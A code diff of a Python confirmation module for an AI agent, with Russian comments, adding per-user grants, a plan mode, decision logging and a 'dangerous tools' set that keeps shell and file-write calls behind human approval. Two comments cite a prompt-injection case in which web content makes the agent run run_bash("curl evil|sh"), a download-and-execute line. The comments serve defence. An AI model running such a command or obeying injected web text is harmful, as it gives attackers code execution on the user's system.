@@ -24,24 +24,46 @@ from omegaconf import OmegaConf
 # browser_media — управление воспроизведением ПО ПРОСЬБЕ юзера («поставь на паузу»):
 # подтверждать просьбу о паузе вопросом «разрешить паузу?» — абсурд.
 _DEFAULT_READONLY = {"capture_screen", "analyze_screen", "notify",
-                     "browser_see", "browser_read", "browser_media"}
+                     "browser_see", "browser_read", "browser_media",
+                     # навык code: обзор репо — read-only (без подтверждения);
+                     # edit_file/run_bash сюда НЕ входят → проходят HITL + зависят от мода.
+                     "glob_files", "grep_repo", "list_tree", "read_lines"}
 
 
-def _load_cfg() -> tuple[bool, set[str], set[str]]:
+# НЕОБРАТИМЫЕ/опасные тулзы: произвольный шелл и запись в ФС. Для них auto-accept (дефолт
+# desktop) НЕ снимает подтверждение — снимает только полный `auto` (явный opt-in в тотальную
+# автономию). Иначе впрыснутый из веб-контента run_bash("curl evil|sh") исполнился бы без
+# чекпойнта (баг ревью SEC-1: injection→RCE). app_control/osascript сюда НЕ входят — там
+# LLM-строки экранируются _esc() в строковые литералы AppleScript (do shell script недостижим).
+_DEFAULT_DANGEROUS = {"run_bash", "edit_file"}
+
+
+def _load_cfg() -> tuple[bool, set[str], set[str], set[str]]:
     try:
         cfg = OmegaConf.load("config.yml")
         require = bool(cfg.get("agent", {}).get("require_confirmation", False))
         skills = set(cfg.get("skills", {}).get("confirm", []) or [])
         readonly = set(cfg.get("skills", {}).get("readonly", []) or []) or set(_DEFAULT_READONLY)
-        return require, skills, readonly
+        dangerous = set(cfg.get("skills", {}).get("dangerous", []) or []) | set(_DEFAULT_DANGEROUS)
+        return require, skills, readonly, dangerous
     except Exception:  # noqa: BLE001
-        return False, set(), set(_DEFAULT_READONLY)
+        return False, set(), set(_DEFAULT_READONLY), set(_DEFAULT_DANGEROUS)
 
 
-REQUIRE_CONFIRMATION, CONFIRM_SKILLS, READONLY_TOOLS = _load_cfg()
+REQUIRE_CONFIRMATION, CONFIRM_SKILLS, READONLY_TOOLS, DANGEROUS_TOOLS = _load_cfg()
 
-# Гранты: разрешённые без вопроса skill.tool (из config cli.allow и «да, всегда» в сессии).
-_grants: set[str] = set()
+# Гранты разделены (анти-эскалация на мульти-клиенте, баг ревью): операторский конфиг (cli.allow) —
+# ГЛОБАЛЬНО намеренно; сессионное «да, всегда» одного юзера — ПЕР-ЮЗЕР (не течёт другим клиентам).
+_config_grants: set[str] = set()            # из config cli.allow (оператор)
+_user_grants: dict[str, set] = {}           # сессионные «да, всегда», по user_id
+
+
+def _uid(user_id: Optional[str] = None) -> str:
+    """user_id из аргумента или из run_context (граница запроса). '' = одиночный оператор (REPL)."""
+    if user_id is not None:
+        return user_id
+    from . import run_context
+    return run_context.current_user_id() or ""
 
 # Режим работы агента (три состояния, выбор юзера):
 #   manual      — подтверждения и уточнения задаются человеку;
@@ -49,29 +71,40 @@ _grants: set[str] = set()
 #                 мышления) как обычно;
 #   auto        — агент автономен ЦЕЛИКОМ: сам выбирает тип мышления, сам решает
 #                 развилки (допущения), действия без подтверждений.
-WORK_MODES = ("manual", "auto-accept", "auto")
-_work_mode: str = "manual"
+#   plan        — ПЛАНИРОВАНИЕ: side-effect действия НЕ исполняются (агент описывает их как
+#                 шаги плана); read-only тулзы работают (исследовать можно). Аналог plan-mode у CLI.
+WORK_MODES = ("manual", "auto-accept", "auto", "plan")
+# Режим работы — ПЕР-ЮЗЕР с глобальным дефолтом (''): desktop/REPL = один оператор (''), на сервере
+# каждый клиент свой. Глобальный '' — fallback (политика оператора), per-user — переопределение.
+_work_mode: dict[str, str] = {}
+_DEFAULT_MODE = "manual"
 
 
-def set_work_mode(mode: str) -> str:
-    """Установить режим работы; неизвестное значение → manual. Возвращает применённый."""
-    global _work_mode
-    _work_mode = mode if mode in WORK_MODES else "manual"
-    return _work_mode
+def set_work_mode(mode: str, user_id: Optional[str] = None) -> str:
+    """Установить режим работы (для текущего/указанного юзера); неизвестное → manual."""
+    m = mode if mode in WORK_MODES else "manual"
+    _work_mode[_uid(user_id)] = m
+    return m
 
 
-def work_mode() -> str:
-    return _work_mode
+def work_mode(user_id: Optional[str] = None) -> str:
+    uid = _uid(user_id)
+    return _work_mode.get(uid) or _work_mode.get("", _DEFAULT_MODE)  # per-user → глобальный дефолт
 
 
 def is_auto() -> bool:
-    """Подтверждения автоматом? (auto-accept и полный auto)."""
-    return _work_mode in ("auto-accept", "auto")
+    """Подтверждения автоматом? (auto-accept и полный auto) — для ТЕКУЩЕГО юзера."""
+    return work_mode() in ("auto-accept", "auto")
 
 
 def full_auto() -> bool:
     """Полная автономия: агент сам выбирает мышление и решает развилки."""
-    return _work_mode == "auto"
+    return work_mode() == "auto"
+
+
+def is_plan() -> bool:
+    """Режим планирования: side-effect действия не исполняются (только описываются)."""
+    return work_mode() == "plan"
 
 
 def set_auto(value: bool) -> None:
@@ -79,15 +112,29 @@ def set_auto(value: bool) -> None:
     set_work_mode("auto-accept" if value else "manual")
 
 
-def load_grants(keys) -> None:
-    """Гранты из конфига (cli.allow) при старте фронтенда."""
-    _grants.update(str(k) for k in (keys or []))
+def load_grants(keys, user_id: Optional[str] = None) -> None:
+    """Гранты из конфига (cli.allow) при старте фронтенда — ОПЕРАТОРСКИЕ (глобально)."""
+    _config_grants.update(str(k) for k in (keys or []))
 
 
-def grant(key: str, persist: bool = True) -> None:
-    """Разрешить skill.tool без дальнейших вопросов; persist → в config.local.yml."""
-    _grants.add(key)
-    if persist:
+def is_granted(key: str, user_id: Optional[str] = None) -> bool:
+    """Разрешён ли skill.tool без вопроса: операторский конфиг ИЛИ сессионный грант ЭТОГО юзера."""
+    return key in _config_grants or key in _user_grants.get(_uid(user_id), set())
+
+
+def clear_grants(user_id: Optional[str] = None) -> None:
+    """Сбросить сессионные гранты текущего/указанного юзера (операторский конфиг не трогаем)."""
+    _user_grants.pop(_uid(user_id), None)
+
+
+def grant(key: str, persist: bool = True, user_id: Optional[str] = None) -> None:
+    """Разрешить skill.tool без дальнейших вопросов — для ЭТОГО юзера (не для всех).
+    persist в config.local.yml ТОЛЬКО для оператора (uid=='' → REPL/desktop одиночный фронтенд):
+    иначе рантайм-«да, всегда» клиента сервера стал бы ГЛОБАЛЬНЫМ грантом после рестарта (утечка
+    per-user→global). На сервере (uid задан) грант остаётся сессионным, не персистится."""
+    uid = _uid(user_id)
+    _user_grants.setdefault(uid, set()).add(key)
+    if persist and uid == "":          # персист — привилегия оператора, не клиента
         try:
             from .cli_config import get_cli, set_cli
             allow = list(get_cli("allow") or [])
@@ -111,6 +158,19 @@ def set_confirmer(fn: Optional[Confirmer]) -> None:
 # Маркер отклонённого пользователем действия — по нему граф понимает, что это НЕ
 # провал агента, а сознательный отказ: не ретраить и не винить ноды (см. step_executor).
 REFUSAL_MARK = "⛔ОТКЛОНЕНО"
+
+
+def _is_dangerous(skill_name: str, tool_name: str) -> bool:
+    """Необратимая/шелл-тулза ИЛИ любой импортированный (сторонний) скилл — для них auto-accept
+    не снимает подтверждение (снимает только полный auto). Сторонний код опасен по своей природе,
+    даже если имя тула не в денилисте."""
+    if tool_name in DANGEROUS_TOOLS:
+        return True
+    try:
+        from .tools.skill_creation import _load_registry
+        return bool(_load_registry().get(skill_name, {}).get("imported"))
+    except Exception:  # noqa: BLE001
+        return False
 
 
 def needs_confirmation(skill_name: str) -> bool:
@@ -165,6 +225,15 @@ async def confirm(description: str) -> bool:
     return approved
 
 
+def _log_decision(action: str, approved: bool, kind: str = "", note: str = "") -> None:
+    """Лог accept/reject решения в .sea/ (no-op без `sea init`). Не роняет тул при ошибке."""
+    try:
+        from .sea_workspace import log_decision
+        log_decision(action, approved, kind, note)
+    except Exception:  # noqa: BLE001
+        pass
+
+
 def wrap_with_confirmation(t, skill_name: str):
     """Оборачивает LangChain-tool уровнями доверия: read-only и грантованное идёт сразу,
     остальное — семантическое подтверждение (см. докстринг модуля)."""
@@ -172,10 +241,21 @@ def wrap_with_confirmation(t, skill_name: str):
 
     async def _arun(**kwargs):
         key = f"{skill_name}.{t.name}"
-        if t.name in READONLY_TOOLS or is_auto() or key in _grants:
-            return await t.ainvoke(kwargs)  # доверено: без вопроса
         args_short = ", ".join(f"{k}={str(v)[:80]}" for k, v in kwargs.items())
+        # PLAN-режим: side-effect тулзы НЕ исполняем — агент описывает их как шаги плана.
+        # read-only сюда не попадают (они без обёртки). Аддитивно: активно только при plan-режиме.
+        if is_plan() and t.name not in READONLY_TOOLS:
+            _log_decision(f"{key}({args_short})", False, "plan")
+            return (f"[PLAN] режим планирования: вызов {t.name}({args_short}) НЕ исполнен. "
+                    f"Опиши это действие как шаг плана, не выполняя его.")
+        # Опасные тулзы (шелл/запись ФС/сторонний код): auto-accept НЕ снимает вопрос — только
+        # полный auto (явный opt-in). Иначе впрыснутый из веб-контента вызов исполнился бы без
+        # чекпойнта (SEC-1). Грант («да, всегда» этого юзера) — сознательный per-tool opt-in, остаётся.
+        auto_ok = full_auto() if _is_dangerous(skill_name, t.name) else is_auto()
+        if t.name in READONLY_TOOLS or auto_ok or is_granted(key):
+            return await t.ainvoke(kwargs)  # доверено: без вопроса (грант — текущего юзера)
         approved, note, kind = await confirm_rich(f"{key}({args_short})")
+        _log_decision(f"{key}({args_short})", approved, kind, note)  # accept/reject → .sea/ (если init)
         if approved:
             if kind == "always":
                 grant(key)  # «да, всегда» → этот тул больше не спрашиваем (персист)
